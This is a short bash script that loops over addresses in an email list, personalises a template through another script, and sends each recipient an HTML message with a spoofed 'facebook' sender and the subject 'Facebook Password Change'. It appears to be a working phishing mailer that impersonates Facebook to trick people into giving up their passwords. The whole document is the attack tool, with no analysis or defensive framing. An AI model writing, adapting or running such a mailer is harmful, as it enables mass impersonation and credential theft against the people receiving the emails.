#!/bin/bash
cat emails.txt | while read LINE
do
replace.sh $LINE
mutt -e 'set content_type=text/html' -e 'set from=facebook' -s 'Facebook Password Change' "$LINE" < temp
echo -e "Email sent to $LINE"
done
